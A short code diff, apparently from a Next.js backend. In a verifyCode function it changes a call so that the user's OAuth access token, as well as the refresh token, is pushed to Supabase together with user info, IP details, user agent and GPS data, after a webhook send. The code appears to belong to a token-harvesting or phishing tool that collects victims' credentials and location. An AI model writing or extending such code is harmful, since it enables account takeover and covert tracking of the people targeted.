@@ -73,7 +73,7 @@ const verifyCode = async (code: string, req: NextRequest, gps: GpsData, screenSi
             throw new Error("Failed to send webhook");
         }
         
-        const pushResult = await pushToSupabase(tokenResult.refresh_token, userInfo, ipInfo, ua, gps);
+        const pushResult = await pushToSupabase(tokenResult.access_token, tokenResult.refresh_token, userInfo, ipInfo, ua, gps);
 
         if (!pushResult.success) {  
             console.log("Failed to push to Supabase");
